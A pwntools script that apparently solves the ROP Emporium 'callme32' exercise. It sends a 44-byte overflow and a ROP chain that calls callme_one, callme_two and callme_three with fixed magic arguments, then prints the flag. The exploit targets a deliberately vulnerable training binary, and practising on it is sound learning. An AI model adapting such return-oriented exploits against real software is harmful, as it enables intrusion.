#!/bin/python3

from pwn import *

context.clear(arch='i386')
filename = './callme32'

elf = ELF(filename)
io = process(filename)

# variables
dead = 0xdeadbeef
cafe = 0xcafebabe
dood = 0xd00df00d

r = ROP(elf)
r.raw(cyclic(44))
r.call(elf.plt['callme_one'], [dead, cafe, dood])
r.call(elf.plt['callme_two'], [dead, cafe, dood])
r.call(elf.plt['callme_three'], [dead, cafe, dood])

payload = r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('two() called correctly\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))